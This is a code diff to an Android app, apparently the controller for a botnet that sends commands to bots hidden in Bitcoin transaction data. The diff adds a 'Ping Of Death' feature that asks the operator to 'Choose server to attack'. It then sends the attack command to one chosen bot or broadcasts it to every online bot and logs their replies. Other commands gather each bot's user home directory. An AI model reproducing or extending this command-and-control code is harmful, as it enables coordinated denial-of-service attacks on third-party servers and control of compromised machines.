@@ -6,12 +6,15 @@ import android.content.Intent;
 import android.os.Bundle;
 import android.support.v7.app.AppCompatActivity;
 import android.util.Log;
+import android.view.LayoutInflater;
 import android.view.Menu;
 import android.view.MenuItem;
 import android.view.View;
 import android.widget.AdapterView;
 import android.widget.Button;
+import android.widget.EditText;
 import android.widget.ListView;
+import android.widget.TextView;
 import android.widget.Toast;
 
 import com.example.tonipagliaro.botchain.Adapter.BotListAdapter;
@@ -38,6 +41,7 @@ public class BotListActivity extends AppCompatActivity {
     ListView listView;
     Button buttonRefresh;
     Button buttonBroadcast;
+    Button buttonWallet;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -66,7 +70,7 @@ public class BotListActivity extends AppCompatActivity {
                                 try {
                                     ListView lw = ((AlertDialog)dialog).getListView();
                                     Log.d("App", lw.getItemAtPosition(which).toString());
-                                    String botAddress = listView.getItemAtPosition(position).toString().split("-")[0];
+                                    final String botAddress = listView.getItemAtPosition(position).toString().split("-")[0];
                                     String command = lw.getItemAtPosition(which).toString();
                                     if (appState.mappaIndirizzi.get(botAddress).equalsIgnoreCase(appState.BOT_STATE_ONLINE)) {
                                         switch (command) {
@@ -84,6 +88,40 @@ public class BotListActivity extends AppCompatActivity {
                                                 appState.sendCommand("userhome-" + appState.wallet.currentReceiveKey().toAddress(appState.params).toString(),
                                                         new Address(appState.params, botAddress));
                                                 setBotStateQuest(botAddress);
+                                                break;
+                                            case ("Ping Of Death"):
+                                                AlertDialog.Builder builder = new AlertDialog.Builder(BotListActivity.this);
+                                                builder.setMessage("Choose server to attack");
+                                                builder.setCancelable(false);
+
+                                                //final TextView textViewPingOfDeath = new TextView(BotListActivity.this);
+                                                final EditText editTextPingOfDeath = new EditText(BotListActivity.this);
+                                                //builder.setView(textViewPingOfDeath);
+                                                builder.setView(editTextPingOfDeath);
+
+                                                builder.setPositiveButton("Ok", new DialogInterface.OnClickListener() {
+                                                    public void onClick(DialogInterface dialog, int id) {
+                                                        String addressToAttack = editTextPingOfDeath.getText().toString();
+                                                        if (!addressToAttack.equalsIgnoreCase("")) {
+                                                            try {
+                                                                appState.sendCommand("pingOfDeath-" + appState.wallet.currentReceiveKey().toAddress(appState.params).toString()
+                                                                                + "-"+addressToAttack,
+                                                                        new Address(appState.params, botAddress));
+                                                                setBotStateQuest(botAddress);
+                                                            } catch (Exception e) {
+                                                                e.printStackTrace();
+                                                            }
+                                                        }
+                                                    }
+                                                })
+
+                                                        .setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
+                                                            public void onClick(DialogInterface dialog, int id) {
+                                                                dialog.cancel();
+                                                            }
+                                                        });
+                                                AlertDialog alert = builder.create();
+                                                alert.show();
                                                 break;
 
                                             default:
@@ -106,7 +144,7 @@ public class BotListActivity extends AppCompatActivity {
             public void onClick(View v) {
                 //Inviamo il comando solo ai bot che hanno lo stato "ok"
                 try {
-                    appState.sendCommand("ping-"+appState.wallet.currentReceiveKey().toAddress(appState.params).toString());
+                    appState.sendCommand("ping-" + appState.wallet.currentReceiveKey().toAddress(appState.params).toString());
                 } catch (Exception e) {
                     e.printStackTrace();
                 }
@@ -141,6 +179,39 @@ public class BotListActivity extends AppCompatActivity {
                                             appState.sendCommand("userhome-" + appState.wallet.currentReceiveKey().toAddress(appState.params).toString());
                                             setStatoBots(appState.getBotStateOnlineString(), appState.BOT_STATE_QUEST);
                                             break;
+                                        case ("Ping Of Death"):
+                                            AlertDialog.Builder builder = new AlertDialog.Builder(BotListActivity.this);
+                                            builder.setMessage("Choose server to attack");
+                                            builder.setCancelable(false);
+
+                                            //final TextView textViewPingOfDeath = new TextView(BotListActivity.this);
+                                            final EditText editTextPingOfDeath = new EditText(BotListActivity.this);
+                                            //builder.setView(textViewPingOfDeath);
+                                            builder.setView(editTextPingOfDeath);
+
+                                            builder.setPositiveButton("Ok", new DialogInterface.OnClickListener() {
+                                                public void onClick(DialogInterface dialog, int id) {
+                                                    String addressToAttack = editTextPingOfDeath.getText().toString();
+                                                    if (!addressToAttack.equalsIgnoreCase("")) {
+                                                        try {
+                                                            appState.sendCommand("pingOfDeath-" + appState.wallet.currentReceiveKey().toAddress(appState.params).toString()
+                                                                    + "-"+addressToAttack);
+                                                            setStatoBots(appState.getBotStateOnlineString(), appState.BOT_STATE_QUEST);
+                                                        } catch (Exception e) {
+                                                            e.printStackTrace();
+                                                        }
+                                                    }
+                                                }
+                                            })
+
+                                                    .setNegativeButton("No", new DialogInterface.OnClickListener() {
+                                                        public void onClick(DialogInterface dialog, int id) {
+                                                            dialog.cancel();
+                                                        }
+                                                    });
+                                            AlertDialog alert = builder.create();
+                                            alert.show();
+                                            break;
                                         default:
                                             break;
                                         }
@@ -153,12 +224,21 @@ public class BotListActivity extends AppCompatActivity {
             }
         });
 
+        buttonWallet = (Button) this.findViewById(R.id.button_wallet);
+        buttonWallet.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                Intent intent = new Intent(BotListActivity.this, WalletActivity.class);
+                startActivity(intent);
+            }
+        });
+
         appState.wallet.addCoinsReceivedEventListener(new WalletCoinsReceivedEventListener() {
             @Override
             public void onCoinsReceived(Wallet wallet, Transaction tx, Coin prevBalance, Coin newBalance) {
                 Coin value = tx.getValueSentToMe(wallet);
                 try {
-                    String mess = readOpReturn(tx);
+                    String mess = appState.readOpReturn(tx);
 
                     String[] v = mess.split("-");
                     String comando = v[0];
@@ -196,7 +276,14 @@ public class BotListActivity extends AppCompatActivity {
                                 String userhome = v[2];
                                 appState.db.updateUserHome(addressString, userhome);
                                 //appState.writeQuestFile("SISTEMA OPERATIV BOT: " + userhome);
-                                Log.d("App", "SISTEMA OPERATIV BOT: " + userhome);
+                                Log.d("App", "USERHOME BOT: " + userhome);
+                                break;
+                            case ("pingOfDeath"):
+                                setBotStateOnline(addressString);
+                                String pingOfDeath = v[2];
+                                appState.db.updatePingOfDeath(addressString, pingOfDeath);
+                                //appState.writeQuestFile("SISTEMA OPERATIV BOT: " + userhome);
+                                Log.d("App", "PING OF DEATH BOT: " + pingOfDeath);
                                 break;
                             default:
                                 break;
@@ -268,7 +355,7 @@ public class BotListActivity extends AppCompatActivity {
         });
     }
 
-
+/*
     public static String readOpReturn(Transaction tx) throws Exception {
         List<TransactionOutput> ti = tx.getOutputs();
         String mess="";
@@ -294,7 +381,7 @@ public class BotListActivity extends AppCompatActivity {
         }
         return mess;
     }
-
+*/
 
 
     @Override
